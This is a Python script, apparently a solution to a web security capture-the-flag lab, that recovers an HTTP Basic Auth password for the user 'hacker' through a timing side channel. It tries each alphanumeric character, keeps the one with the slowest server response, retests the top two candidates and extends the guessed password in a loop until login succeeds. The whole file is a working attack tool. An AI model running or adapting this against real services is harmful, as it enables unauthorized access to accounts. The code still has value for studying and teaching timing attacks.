#! /User/kelseytroeger/webSecCTF/env/bin/python3

import requests
import time
import sys
import re
from bs4 import BeautifulSoup


"""Check that the user supplied an IP or web address. Syntax should be [python3 websecp2.py localhost:8000]"""
if len(sys.argv) != 2 :
    print("Too few arguments")
    sys.exit()

# Initialization
address = sys.argv[1]
password = ""
while True : 
    pass_list = ['0','1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
    list_length = len(pass_list)
    first= second = 0
    letter1 = letter2 = ""
    url = "http://"+address+"/authentication/example2/"
    session = requests.Session()
    
    # Check password when it's blank first
    check = session.get(url, auth=('hacker', password))    
    if(check.status_code) == 200 :
        print("Success! Password is: ", password)
        sys.exit()
    # Checks to see if the return code is still "unauthorized"
    elif(check.status_code) == 401 :
        print("Continuing...")
    else :
        print("Bad request")
        sys.exit()

    # Iterates through alphanumeric list
    for x in range(list_length) :
        r = session.get(url, auth=('hacker', password+pass_list[x]))
        print("Testing:", password, ":", pass_list[x], "->", r.elapsed.total_seconds())
        
        # As the elapsed time is calculated, keep track of top first and second longest response times
        y = r.elapsed.total_seconds()
        if y > first :
            letter1 = pass_list[x]
            second = first
            first = y
        elif (y > second and y != first) :
            letter2 = pass_list[x]
            second = y 

    print("Most likely letter: ", letter1, "->", first)
    print("Second most likely: ", letter2, "->", second)
    print("Retesting...")
    
    # Double check the two most likely characters in case of delay spike
    check1 = session.get(url, auth=('hacker', password+letter1))
    s = check1.elapsed.total_seconds()
    check2 = session.get(url, auth=('hacker', password+letter2))    
    t = check2.elapsed.total_seconds()
    
    # Append correct letter to current password 
    password = password+letter1 if s > t else password+letter2
    print("Current password : ", password)
    
    
